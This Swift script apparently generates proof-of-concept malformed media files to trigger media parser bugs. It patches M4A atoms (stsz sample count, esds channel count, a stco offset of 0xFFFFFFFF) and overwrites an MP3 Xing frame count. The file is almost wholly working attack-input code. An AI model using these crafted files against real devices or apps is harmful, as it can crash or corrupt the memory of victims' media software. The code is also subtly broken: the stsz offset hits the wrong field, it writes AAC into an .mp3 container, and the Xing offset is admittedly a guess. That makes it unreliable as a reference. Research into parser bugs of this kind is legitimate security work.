import Foundation
import AVFoundation
import CoreMedia

// Helper to parse and modify MP4 atoms
class MP4AtomParser {
    var data: Data
    var position: Int = 0
    
    init(data: Data) {
        self.data = data
    }
    
    func readUInt32() -> UInt32 {
        guard position + 4 <= data.count else { return 0 }
        let value = data[position..<position+4].withUnsafeBytes { $0.load(as: UInt32.self).bigEndian }
        position += 4
        return value
    }
    
    func readData(count: Int) -> Data {
        guard position + count <= data.count else { return Data() }
        let subdata = data[position..<position+count]
        position += count
        return subdata
    }
    
    func findAtom(_ name: String) -> (offset: Int, size: Int)? {
        let nameData = name.data(using: .ascii)!
        position = 0
        while position < data.count {
            let start = position
            let size = Int(readUInt32())
            let type = readData(count: 4)
            if type == nameData {
                return (offset: start, size: size)
            }
            position = start + (size == 0 ? data.count : size)
        }
        return nil
    }
    
    func replaceData(at offset: Int, with newData: Data) {
        data.replaceSubrange(offset..<offset+newData.count, with: newData)
    }
}

func manipulatePoC1(inputURL: URL, outputURL: URL) throws {
    // PoC 1: Set stsz sample count to 8192
    let data = try Data(contentsOf: inputURL)
    let parser = MP4AtomParser(data: data)
    
    guard let stsz = parser.findAtom("stsz") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stsz atom not found"])
    }
    
    let sampleCountOffset = stsz.offset + 8 + 4 // Skip version, flags, sample_size
    var newData = Data()
    newData.append(contentsOf: UInt32(8192).bigEndian.data)
    parser.replaceData(at: sampleCountOffset, with: newData)
    
    try parser.data.write(to: outputURL)
    print("PoC 1: Set stsz sample count to 8192 in \(outputURL.path)")
}

func manipulatePoC2(inputURL: URL, outputURL: URL) throws {
    // PoC 2: Set esds channel count to 8
    let data = try Data(contentsOf: inputURL)
    let parser = MP4AtomParser(data: data)
    
    guard let esds = parser.findAtom("esds") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "esds atom not found"])
    }
    
    let channelOffset = esds.offset + 8 + 0x1B
    parser.replaceData(at: channelOffset, with: Data([8]))
    
    try parser.data.write(to: outputURL)
    print("PoC 2: Set esds channel count to 8 in \(outputURL.path)")
}

func manipulatePoC5(inputURL: URL, outputURL: URL) throws {
    // PoC 5: Set invalid stco offset
    let data = try Data(contentsOf: inputURL)
    let parser = MP4AtomParser(data: data)
    
    guard let stco = parser.findAtom("stco") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stco atom not found"])
    }
    
    let entryOffset = stco.offset + 8 + 4 // Skip version, flags, entry_count
    var newData = Data()
    newData.append(contentsOf: UInt32(0xFFFFFFFF).bigEndian.data)
    parser.replaceData(at: entryOffset, with: newData)
    
    try parser.data.write(to: outputURL)
    print("PoC 5: Set invalid stco offset in \(outputURL.path)")
}

func generateMP3(filename: String, duration: Double, channels: Int, sampleRate: Double, pocNumber: Int) throws {
    // Generate MP3 using AVAssetWriter
    let outputURL = URL(fileURLWithPath: filename)
    let format = AVAudioFormat(standardFormatWithSampleRate: sampleRate, channels: UInt32(channels))!
    let frameCount = UInt32(duration * sampleRate)
    let buffer = AVAudioPCMBuffer(pcmFormat: format, frameCapacity: frameCount)!
    buffer.frameLength = frameCount
    if let floatData = buffer.floatChannelData {
        for channel in 0..<Int(format.channelCount) {
            memset(floatData[channel], 0, Int(frameCount) * MemoryLayout<Float>.size)
        }
    }
    
    let writer = try AVAssetWriter(outputURL: outputURL, fileType: .mp3)
    let bitrate = pocNumber == 4 ? 320000 : 128000 // PoC 4: 320 kbps
    let settings: [String: Any] = [
        AVFormatIDKey: kAudioFormatMPEG4AAC,
        AVSampleRateKey: sampleRate,
        AVNumberOfChannelsKey: channels,
        AVEncoderBitRateKey: bitrate
    ]
    let audioInput = AVAssetWriterInput(mediaType: .audio, outputSettings: settings)
    writer.add(audioInput)
    writer.startWriting()
    writer.startSession(atSourceTime: .zero)
    
    var formatDesc: CMAudioFormatDescription?
    let asbd = format.streamDescription
    CMAudioFormatDescriptionCreate(allocator: kCFAllocatorDefault,
                                  asbd: asbd,
                                  layoutSize: 0,
                                  layout: nil,
                                  magicCookieSize: 0,
                                  magicCookie: nil,
                                  extensions: nil,
                                  formatDescriptionOut: &formatDesc)
    
    var sampleBuffer: CMSampleBuffer?
    let blockBufferLength = Int(frameCount) * Int(format.channelCount) * MemoryLayout<Float>.size
    var blockBuffer: CMBlockBuffer?
    CMBlockBufferCreateWithMemoryBlock(allocator: kCFAllocatorDefault,
                                      memoryBlock: buffer.floatChannelData![0],
                                      blockLength: blockBufferLength,
                                      blockAllocator: kCFAllocatorNull,
                                      customBlockSource: nil,
                                      offsetToData: 0,
                                      dataLength: blockBufferLength,
                                      flags: 0,
                                      blockBufferOut: &blockBuffer)
    let timing = CMSampleTimingInfo(duration: CMTime(value: 1, timescale: Int32(sampleRate)),
                                   presentationTimeStamp: .zero,
                                   decodeTimeStamp: .invalid)
    CMSampleBufferCreate(allocator: kCFAllocatorDefault,
                        dataBuffer: blockBuffer,
                        dataReady: true,
                        makeDataReadyCallback: nil,
                        refcon: nil,
                        formatDescription: formatDesc,
                        sampleCount: CMItemCount(frameCount),
                        sampleTimingEntryCount: 1,
                        sampleTimingArray: [timing],
                        sampleSizeEntryCount: 0,
                        sampleSizeArray: nil,
                        sampleBufferOut: &sampleBuffer)
    audioInput.append(sampleBuffer!)
    audioInput.markAsFinished()
    writer.finishWriting {
        print("Generated MP3 \(filename)")
    }
    
    while writer.status == .writing {
        Thread.sleep(forTimeInterval: 0.1)
    }
    if writer.status == .failed {
        throw writer.error ?? NSError(domain: "AVAssetWriter", code: -1, userInfo: nil)
    }
    
    // PoC 3: Add Xing frames=20000 metadata via hex edit
    if pocNumber == 3 {
        var mp3Data = try Data(contentsOf: outputURL)
        // Simplified Xing header insertion (offset 0x24 for frame count in Xing tag)
        // Assuming Xing tag exists; real-world would need parsing
        let frameCountOffset = 0x24 // Approximate, needs validation
        if mp3Data.count > frameCountOffset + 4 {
            let frameCountData = UInt32(20000).bigEndian.data
            mp3Data.replaceSubrange(frameCountOffset..<frameCountOffset+4, with: frameCountData)
            try mp3Data.write(to: outputURL)
            print("PoC 3: Set Xing frames to 20000 in \(filename)")
        } else {
            throw NSError(domain: "MP3", code: -1, userInfo: [NSLocalizedDescriptionKey: "Invalid MP3 for Xing edit"])
        }
    }
}

extension UInt32 {
    var data: Data {
        var value = self.bigEndian
        return Data(bytes: &value, count: MemoryLayout<UInt32>.size)
    }
}

func main() {
    let fileManager = FileManager.default
    
    for i in 1...5 {
        let inputFile = "base_poc\(i).m4a"
        let outputM4A = "poc\(i).m4a"
        let outputMP3 = "poc\(i).mp3"
        
        guard fileManager.fileExists(atPath: inputFile) else {
            print("Error: \(inputFile) not found")
            exit(1)
        }
        
        let inputURL = URL(fileURLWithPath: inputFile)
        let outputM4AURL = URL(fileURLWithPath: outputM4A)
        let outputMP3URL = URL(fileURLWithPath: outputMP3)
        
        do {
            // Generate M4A
            switch i {
            case 1:
                try manipulatePoC1(inputURL: inputURL, outputURL: outputM4AURL)
            case 2:
                try manipulatePoC2(inputURL: inputURL, outputURL: outputM4AURL)
            case 3, 4:
                try fileManager.copyItem(at: inputURL, to: outputM4AURL)
                print("Copied \(inputFile) to \(outputM4A) for PoC \(i)")
            case 5:
                try manipulatePoC5(inputURL: inputURL, outputURL: outputM4AURL)
            default:
                break
            }
            
            // Generate MP3 independently
            try generateMP3(filename: outputMP3, duration: 1.0, channels: 1, sampleRate: 44100.0, pocNumber: i)
        } catch {
            print("Error processing PoC \(i): \(error.localizedDescription)")
            exit(1)
        }
    }
}

main()
